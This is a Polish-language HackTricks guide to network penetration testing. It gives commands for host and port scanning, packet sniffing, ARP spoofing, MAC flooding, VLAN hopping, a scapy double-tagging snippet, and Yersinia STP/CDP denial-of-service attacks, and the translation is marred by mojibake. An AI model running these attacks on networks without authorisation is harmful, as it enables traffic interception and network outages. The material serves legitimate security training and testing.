# Testowanie penetracyjne sieci

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Wskaz贸wka dotyczca nagrody za bd**: **Zarejestruj si** na platformie **Intigriti**, premium **platformie do nagr贸d za bdy stworzonej przez haker贸w, dla haker贸w**! Docz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) ju偶 dzi i zacznij zarabia nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Odkrywanie host贸w z zewntrz

To bdzie **kr贸tka sekcja** dotyczca sposob贸w znajdowania **odpowiadajcych adres贸w IP** z **Internetu**.\
W tej sytuacji masz pewien **zakres adres贸w IP** (mo偶e nawet kilka **zakres贸w**) i chcesz po prostu dowiedzie si, **kt贸re adresy IP odpowiadaj**.

### ICMP

To jest **najatwiejszy** i **najszybszy** spos贸b na odkrycie, czy host jest aktywny, czy nie.\
Mo偶esz spr贸bowa wysa kilka pakiet贸w **ICMP** i **oczekiwa odpowiedzi**. Najprostszym sposobem jest wysanie **偶dania echo** i oczekiwanie na odpowied藕. Mo偶esz to zrobi za pomoc prostego polecenia `ping` lub u偶ywajc `fping` do **zakres贸w**.\
Mo偶esz tak偶e u偶y **nmap** do wysyania innych rodzaj贸w pakiet贸w ICMP (to pozwoli omin filtry dla standardowego 偶dania-odpowiedzi echo ICMP).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Odkrywanie port贸w TCP

Bardzo czsto zdarza si, 偶e wszystkie rodzaje pakiet贸w ICMP s filtrowane. W takim przypadku jedyn rzecz, kt贸r mo偶esz zrobi, aby sprawdzi, czy host jest aktywny, jest **sprawdzenie otwartych port贸w**. Ka偶dy host ma **65535 port贸w**, wic jeli masz "du偶y" zakres, **nie mo偶esz** testowa, czy **ka偶dy port** ka偶dego hosta jest otwarty czy nie, poniewa偶 zajoby to zbyt du偶o czasu.\
W takim przypadku potrzebujesz **szybkiego skanera port贸w** ([masscan](https://github.com/robertdavidgraham/masscan)) oraz listy **najczciej u偶ywanych port贸w:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### Odkrywanie port贸w HTTP

Jest to po prostu odkrywanie port贸w TCP przydatne, gdy chcesz **skupi si na odkrywaniu usug HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Odkrywanie port贸w UDP

Mo偶esz r贸wnie偶 spr贸bowa sprawdzi, czy **jest otwarty port UDP**, aby zdecydowa, czy powiniene **zwr贸ci wiksz uwag** na **hosta.** Poniewa偶 usugi UDP zazwyczaj **nie odpowiadaj** **偶adnymi danymi** na zwyky pusty pakiet sondy UDP, trudno powiedzie, czy port jest filtrowany czy otwarty. Najprostszym sposobem na podjcie decyzji jest wysanie pakietu zwizane z dziaajc usug, a poniewa偶 nie wiesz, kt贸ra usuga jest uruchomiona, powiniene spr贸bowa najbardziej prawdopodobnej na podstawie numeru portu:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Linia nmap zaproponowana wczeniej przetestuje **top 1000 port贸w UDP** w ka偶dym hocie w zakresie **/24**, ale nawet to zajmie **>20 minut**. Jeli potrzebujesz **szybkich wynik贸w**, mo偶esz u偶y [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` To wyle te **sondy UDP** do ich **oczekiwanych port贸w** (dla zakresu /24 zajmie to tylko 1 minut): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Odkrywanie port贸w SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Testowanie penetracyjne Wifi

Tutaj znajdziesz adny przewodnik po wszystkich dobrze znanych atakach na Wifi w czasie pisania:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Odkrywanie host贸w od wewntrz

Jeli jeste wewntrz sieci, jedn z pierwszych rzeczy, kt贸re chcesz zrobi, jest **odkrycie innych host贸w**. W zale偶noci od **tego, jak wiele haasu** mo偶esz/chcesz zrobi, mo偶na wykona r贸偶ne dziaania:

### Pasywny

Mo偶esz u偶y tych narzdzi do pasywnego odkrywania host贸w w poczonej sieci:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktywne

Zauwa偶, 偶e techniki om贸wione w [_**Odkrywanie host贸w z zewntrz**_](./#discovering-hosts-from-the-outside) (_Odkrywanie port贸w TCP/HTTP/UDP/SCTP_) mog by r贸wnie偶 **zastosowane tutaj**.\
Jednak, poniewa偶 znajdujesz si w **tym samym sieci**, co inne hosty, mo偶esz zrobi **wicej rzeczy**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktywne ICMP

Zauwa偶, 偶e techniki om贸wione w _Odkrywanie host贸w z zewntrz_ ([_**ICMP**_](./#icmp)) mog by r贸wnie偶 **stosowane tutaj**.\
Jednak, poniewa偶 jeste w **takiej samej sieci** jak inne hosty, mo偶esz zrobi **wicej rzeczy**:

* Jeli **pingujesz** **adres rozgoszeniowy podsieci**, ping powinien dotrze do **ka偶dego hosta** i mog oni **odpowiedzie** do **Ciebie**: `ping -b 10.10.5.255`
* Pingujc **adres rozgoszeniowy sieci**, mo偶esz nawet znale藕 hosty wewntrz **innych podsieci**: `ping -b 255.255.255.255`
* U偶yj flag `-PE`, `-PP`, `-PM` narzdzia `nmap` do przeprowadzenia odkrywania host贸w wysyajc odpowiednio 偶dania **ICMPv4 echo**, **znacznik czasu** i **mask podsieci:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Budzenie przez sie (Wake On Lan)**

Budzenie przez sie (Wake On Lan) su偶y do **wczania** komputer贸w za pomoc **wiadomoci sieciowej**. Pakiet magiczny u偶ywany do wczenia komputera to po prostu pakiet, w kt贸rym podany jest **MAC Dst**, a nastpnie jest **powtarzany 16 razy** w tym samym pakiecie.\
Nastpnie tego rodzaju pakiety s zazwyczaj wysyane w ramce **ethernet 0x0842** lub w pakiecie **UDP na port 9**.\
Jeli nie jest podany **偶aden \[MAC]**, pakiet jest wysyany do **rozgoszeniowego ethernetu** (a rozgoszeniowy MAC bdzie powtarzany).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skanowanie host贸w

Po odkryciu wszystkich adres贸w IP (zewntrznych lub wewntrznych), kt贸re chcesz dokadnie zeskanowa, mo偶na wykona r贸偶ne dziaania.

### TCP

* **Otwarty** port: _SYN --> SYN/ACK --> RST_
* **Zamknity** port: _SYN --> RST/ACK_
* **Filtrowany** port: _SYN --> \[BRAK ODPOWIEDZI]_
* **Filtrowany** port: _SYN --> Wiadomo ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Istniej 2 opcje skanowania portu UDP:

* Wylij **pakiet UDP** i sprawd藕 odpowied藕 _**ICMP unreachable**_, jeli port jest **zamknity** (w wielu przypadkach ICMP bdzie **filtrowany**, wic nie otrzymasz 偶adnych informacji, czy port jest zamknity czy otwarty).
* Wylij **sformatowane datagramy**, aby wywoa odpowied藕 z **usugi** (np. DNS, DHCP, TFTP i inne, jak wymienione w _nmap-payloads_). Jeli otrzymasz **odpowied藕**, to port jest **otwarty**.

**Nmap** bdzie **czy obie** opcje, u偶ywajc "-sV" (skany UDP s bardzo wolne), ale zauwa偶, 偶e skany UDP s wolniejsze ni偶 skany TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Skanowanie SCTP

**SCTP (Protok贸 transmisji sterowanej strumieniem)** zosta zaprojektowany do u偶ytku obok **TCP (Protok贸 sterowania transmisj)** i **UDP (Protok贸 datagram贸w u偶ytkownika)**. Jego g贸wnym celem jest uatwienie transportu danych telefonicznych w sieciach IP, odzwierciedlajc wiele cech niezawodnoci znalezionych w **Systemie sygnalizacyjnym 7 (SS7)**. **SCTP** jest podstawowym skadnikiem rodziny protoko贸w **SIGTRAN**, kt贸re maj na celu transport sygna贸w SS7 w sieciach IP.

Wsparcie dla **SCTP** jest dostarczane przez r贸偶ne systemy operacyjne, takie jak **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, co wskazuje na jego szerokie akceptowanie i u偶yteczno w dziedzinie telekomunikacji i sieci.

Nmap oferuje dwa r贸偶ne skany dla SCTP: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Unikanie wykrycia przez IDS i IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Wicej opcji nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Ujawnianie wewntrznych adres贸w IP

**殴le skonfigurowane routery, firewalle i urzdzenia sieciowe** czasami odpowiadaj na sondy sieciowe, u偶ywajc **niepublicznych adres贸w 藕r贸dowych**. **tcpdump** mo偶e by wykorzystany do identyfikacji pakiet贸w otrzymywanych z adres贸w prywatnych podczas testowania. W szczeg贸lnoci, na Kali Linux, pakiety mog by przechwytywane na interfejsie **eth2**, kt贸ry jest dostpny z publicznego Internetu. Warto zauwa偶y, 偶e jeli twoje rodowisko jest za NAT-em lub Firewallem, takie pakiety prawdopodobnie zostan odfiltrowane.
```bash
tcpdump nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Podsuchiwanie

Podczas podsuchiwania mo偶esz dowiedzie si szczeg贸贸w dotyczcych zakres贸w adres贸w IP, rozmiar贸w podsieci, adres贸w MAC i nazw host贸w, przegldajc przechwycone ramki i pakiety. Jeli sie jest 藕le skonfigurowana lub tkanina przeczajca jest obci偶ona, atakujcy mog przechwyci poufne materiay poprzez pasywne podsuchiwanie sieci.

Jeli przeczona sie Ethernet jest poprawnie skonfigurowana, zobaczysz tylko ramki rozgoszeniowe i materia przeznaczony dla Twojego adresu MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Mo偶na r贸wnie偶 przechwytywa pakiety z zdalnej maszyny podczas sesji SSH za pomoc Wireshark jako interfejsu GUI w czasie rzeczywistym.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Oczywicie.

### Przechwytywanie powiadcze

Mo偶esz u偶y narzdzi takich jak [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) do analizy powiadcze z pliku pcap lub interfejsu na 偶ywo.

## Ataki LAN

### ARP spoofing

ARP Spoofing polega na wysyaniu faszywych odpowiedzi ARP w celu wskazania, 偶e IP maszyny ma MAC naszego urzdzenia. Nastpnie ofiara zmieni tabel ARP i bdzie kontaktowa si z naszym urzdzeniem za ka偶dym razem, gdy chce skontaktowa si z podszywanym adresem IP.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### Zatapianie MAC - przepenienie CAM

Przepenij tabel CAM przecznika, wysyajc wiele pakiet贸w z r贸偶nymi adresami MAC 藕r贸dowymi. Gdy tabela CAM jest pena, przecznik zaczyna zachowywa si jak koncentrator (rozsyajc cay ruch).
```bash
macof -i <interface>
```
W nowoczesnych przecznikach ta podatno zostaa naprawiona.

### Ataki 802.1Q VLAN / DTP

#### Dynamiczne Trunkowanie

Protok贸 **Dynamic Trunking Protocol (DTP)** zosta zaprojektowany jako protok贸 warstwy cza umo偶liwiajcy automatyczny system trunkowania, pozwalajc przecznikom automatycznie wybiera porty w trybie trunk (Trunk) lub nie-trunk. Wdro偶enie **DTP** jest czsto postrzegane jako wskazanie na suboptymalny projekt sieci, podkrelajc konieczno rcznej konfiguracji trunk贸w tylko tam, gdzie jest to konieczne, oraz zapewnienia odpowiedniej dokumentacji.

Domylnie porty przecznika s ustawione na tryb Dynamic Auto, co oznacza, 偶e s gotowe do rozpoczcia trunkowania, jeli zostan do tego skonione przez ssiedni przecznik. Problem zwizany z bezpieczestwem pojawia si, gdy pentester lub atakujcy podcza si do przecznika i wysya ramk DTP Desirable, zmuszajc port do przejcia w tryb trunk. Ta czynno umo偶liwia atakujcemu wyliczenie VLAN-贸w poprzez analiz ramek STP oraz obejcie segmentacji VLAN poprzez konfiguracj interfejs贸w wirtualnych.

Obecno DTP w wielu przecznikach domylnie mo偶e by wykorzystana przez przeciwnik贸w do naladowania zachowania przecznika, co umo偶liwia dostp do ruchu we wszystkich VLAN-ach. Skrypt [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) jest wykorzystywany do monitorowania interfejsu, ujawniajc, czy przecznik jest w trybie domylnym, trunk, dynamic, auto lub accessten ostatni jest jedyn konfiguracj odporn na ataki VLAN hopping. Narzdzie to ocenia stan podatnoci przecznika.

Jeli zidentyfikowano podatno sieciow, narzdzie _**Yersinia**_ mo偶e by wykorzystane do "wczenia trunkowania" za pomoc protokou DTP, umo偶liwiajc obserwacj pakiet贸w ze wszystkich VLAN-贸w.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

Aby wyliczy VLAN-y, mo偶na r贸wnie偶 wygenerowa ramk DTP Desirable za pomoc skryptu [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**ie przerywaj skryptu pod 偶adnym pozorem. Wstrzykuje on ramki DTP Desirable co trzy sekundy. **Dynamicznie tworzone kanay trunkowe na przeczniku istniej tylko przez pi minut. Po upywie piciu minut kana trunkowy znika.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Chciabym zwr贸ci uwag, 偶e **Dostpny/呕dany (0x03)** oznacza, 偶e ramka DTP jest typu 呕dany, co informuje port o przeczeniu si w tryb Trunk. Natomiast **802.1Q/802.1Q (0xa5)** wskazuje typ enkapsulacji **802.1Q**.

Analizujc ramki STP, **dowiedzielimy si o istnieniu VLAN 30 i VLAN 60**.

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atakowanie konkretnych VLAN贸w

Gdy znasz identyfikatory VLAN i wartoci IP, mo偶esz **skonfigurowa wirtualny interfejs do ataku na okrelony VLAN**.\
Jeli DHCP nie jest dostpne, u偶yj _ifconfig_ do ustawienia statycznego adresu IP.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatyczny skaczcy VLAN

Omawiany atak **Dynamic Trunking i tworzenie wirtualnych interfejs贸w oraz odkrywanie host贸w w innych** VLAN-ach jest **automatycznie wykonywany** przez narzdzie: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Podw贸jne oznakowanie

Jeli atakujcy zna warto **MAC, IP i ID VLAN ofiary**, mo偶e spr贸bowa **podw贸jnie oznakowa ramk** z jej przeznaczonym VLAN-em i VLAN-em ofiary, a nastpnie wysa pakiet. Poniewa偶 **ofiara nie bdzie moga si poczy z powrotem** z atakujcym, najlepsz opcj dla atakujcego jest komunikacja za pomoc UDP z protokoami, kt贸re mog wykona pewne interesujce akcje (np. SNMP).

Inn opcj dla atakujcego jest uruchomienie **skanowania port贸w TCP podajc jako 藕r贸do IP kontrolowane przez atakujcego i dostpne dla ofiary** (prawdopodobnie przez internet). Nastpnie atakujcy m贸gby podsuchiwa w drugim hostu nale偶cym do niego, czy otrzymuje jakie pakiety od ofiary.

![](<../../.gitbook/assets/image (190).png>)

Aby przeprowadzi ten atak, mo偶na u偶y narzdzia scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Ominicie Segmentacji VLAN Lateralna <a href="#d679" id="d679"></a>

Jeli masz **dostp do przecznika, do kt贸rego jeste bezporednio podczony**, masz mo偶liwo **ominicia segmentacji VLAN** w sieci. Po prostu **zmie port na tryb trunk** (inaczej znany jako trunk), stw贸rz wirtualne interfejsy z identyfikatorami docelowych VLAN-贸w i skonfiguruj adres IP. Mo偶esz spr贸bowa 偶da adresu dynamicznie (DHCP) lub skonfigurowa go statycznie. To zale偶y od sytuacji.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Ominicie Prywatnego VLAN Warstwy 3

W pewnych rodowiskach, takich jak sieci bezprzewodowe dla goci, ustawienia **izolacji port贸w (znane r贸wnie偶 jako prywatny VLAN)** s wdro偶one w celu zapobie偶enia bezporedniej komunikacji klient贸w podczonych do punktu dostpu bezprzewodowego. Zidentyfikowano jednak technik, kt贸ra mo偶e obej te rodki izolacji. Ta technika wykorzystuje brak list ACL sieciowych lub ich nieprawidow konfiguracj, umo偶liwiajc przekierowanie pakiet贸w IP przez router, aby dotrze do innego klienta w tej samej sieci.

Atak jest przeprowadzany poprzez stworzenie **pakietu, kt贸ry przenosi adres IP docelowego klienta, ale z adresem MAC routera**. Powoduje to bdne przekierowanie pakietu przez router do klienta docelowego. Ten spos贸b dziaania jest podobny do tego u偶ywanego w atakach podw贸jnego znakowania, gdzie mo偶liwo kontrolowania hosta dostpnego dla ofiary jest wykorzystywana do wykorzystania luki w zabezpieczeniach.

**Kluczowe Kroki Ataku:**

1. **Tworzenie Pakietu:** Pakiet jest specjalnie przygotowany tak, aby zawiera adres IP docelowego klienta, ale z adresem MAC routera.
2. **Wykorzystanie Zachowania Routera:** Przygotowany pakiet jest wysyany do routera, kt贸ry, ze wzgldu na konfiguracj, przekierowuje pakiet do klienta docelowego, omijajc izolacj zapewnion przez ustawienia prywatnego VLAN.

### Ataki VTP

VTP (VLAN Trunking Protocol) centralizuje zarzdzanie VLAN-ami. Wykorzystuje numery rewizji do utrzymania integralnoci bazy danych VLAN; ka偶da modyfikacja zwiksza ten numer. Przeczniki przyjmuj konfiguracje z wy偶szymi numerami rewizji, aktualizujc swoje bazy danych VLAN.

#### Role Domeny VTP

* **Serwer VTP:** Zarzdza VLAN-amitworzy, usuwa, modyfikuje. Wysya ogoszenia VTP do czonk贸w domeny.
* **Klient VTP:** Odbiera ogoszenia VTP w celu zsynchronizowania swojej bazy danych VLAN. Ta rola jest ograniczona od modyfikacji lokalnej konfiguracji VLAN.
* **Transparentny VTP:** Nie uczestniczy w aktualizacjach VTP, ale przekazuje ogoszenia VTP. Nie dotycz go ataki VTP, utrzymuje stay numer rewizji r贸wny zero.

#### Typy Ogosze VTP

* **Ogoszenie Podsumowujce:** Wysyane przez serwer VTP co 300 sekund, przenoszce istotne informacje o domenie.
* **Ogoszenie Podzbi贸r:** Wysyane po zmianach konfiguracji VLAN.
* **呕danie Ogoszenia:** Wystawiane przez klienta VTP w celu 偶dania Ogoszenia Podsumowujcego, zazwyczaj w odpowiedzi na wykrycie wy偶szego numeru rewizji konfiguracji.

Ukady VTP s podatne na ataki wycznie poprzez porty trunkowe, poniewa偶 ogoszenia VTP kr偶 wycznie przez nie. Scenariusze atak贸w po DTP mog skierowa si w stron VTP. Narzdzia takie jak Yersinia mog uatwi ataki VTP, majce na celu usunicie bazy danych VLAN, skutecznie zak贸cajc sie.

Uwaga: Ta dyskusja dotyczy wersji VTP 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
### Ataki STP

**Jeli nie mo偶esz przechwyci ramek BPDU na swoich interfejsach, mao prawdopodobne jest, 偶e uda ci si przeprowadzi atak STP.**

#### **DoS BPDU STP**

Wysyajc wiele ramek BPDUs TCP (Topology Change Notification) lub Conf (BPDUs wysyane podczas tworzenia topologii), przeczniki zostaj przeci偶one i przestaj dziaa poprawnie.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Atak STP TCP**

Kiedy zostanie wysane TCP, tabela CAM przecznik贸w zostanie usunita w cigu 15s. Nastpnie, jeli wysyasz cigle ten rodzaj pakiet贸w, tabela CAM bdzie cigle restartowana (co 15 sekund) i gdy zostanie zrestartowana, przecznik zachowuje si jak koncentrator.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Atak na korze STP**

Atakujcy symuluje zachowanie przecznika, aby sta si korzeniem STP sieci. Wtedy wicej danych bdzie przechodzi przez niego. Jest to interesujce, gdy jeste podczony do dw贸ch r贸偶nych przecznik贸w.\
Dzieje si to poprzez wysyanie pakiet贸w CONF BPDUs m贸wicych, 偶e warto **priorytetu** jest mniejsza ni偶 rzeczywisty priorytet rzeczywistego przecznika korzenia.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Jeli atakujcy jest podczony do 2 przecznik贸w, mo偶e sta si korzeniem nowego drzewa i cay ruch pomidzy tymi przecznikami bdzie przechodzi przez niego** (ataku typu MITM zostanie przeprowadzony).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataki CDP

Protok贸 Odkrywania CISCO (CDP) jest niezbdny do komunikacji midzy urzdzeniami CISCO, umo偶liwiajc im **identyfikacj siebie nawzajem i udostpnianie szczeg贸贸w konfiguracji**.

#### Pasywne Zbieranie Danych <a href="#id-0e0f" id="id-0e0f"></a>

CDP jest skonfigurowany do rozgaszania informacji przez wszystkie porty, co mo偶e prowadzi do ryzyka bezpieczestwa. Atakujcy, po podczeniu do portu przecznika, mo偶e zastosowa narzdzia do przechwytywania sieci takie jak **Wireshark**, **tcpdump** lub **Yersinia**. Ta akcja mo偶e ujawni wra偶liwe dane na temat urzdzenia sieciowego, w tym jego model i wersj systemu Cisco IOS, kt贸ry jest u偶ywany. Nastpnie atakujcy mo偶e skierowa si przeciwko konkretnym podatnociom w zidentyfikowanej wersji Cisco IOS.

#### Wywoywanie Zatoczenia Tabeli CDP <a href="#id-0d6a" id="id-0d6a"></a>

Bardziej agresywne podejcie polega na uruchomieniu ataku typu Denial of Service (DoS), przytaczajc pami przecznika, udajc prawidowe urzdzenia CISCO. Poni偶ej znajduje si sekwencja polece do zainicjowania takiego ataku przy u偶yciu narzdzia sieciowego Yersinia, przeznaczonego do testowania:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Podczas tego ataku, procesor przecznika oraz tabela ssiad贸w CDP s silnie obci偶one, prowadzc czsto do tzw. **"parali偶u sieci"** z powodu nadmiernego zu偶ycia zasob贸w. 

#### Atak podszywania si pod CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Mo偶esz r贸wnie偶 u偶y [**scapy**](https://github.com/secdev/scapy/). Upewnij si, 偶e instalujesz go z pakietem `scapy/contrib`.

### Ataki VoIP i narzdzie VoIP Hopper

Telefony VoIP, coraz bardziej zintegrowane z urzdzeniami IoT, oferuj funkcje takie jak otwieranie drzwi lub sterowanie termostatami za pomoc specjalnych numer贸w telefon贸w. Jednak ta integracja mo偶e stanowi ryzyko dla bezpieczestwa.

Narzdzie [**voiphopper**](http://voiphopper.sourceforge.net) zostao zaprojektowane do emulowania telefonu VoIP w r贸偶nych rodowiskach (Cisco, Avaya, Nortel, Alcatel-Lucent). Odkrywa identyfikator VLAN sieci gosowej za pomoc protoko贸w takich jak CDP, DHCP, LLDP-MED i 802.1Q ARP.

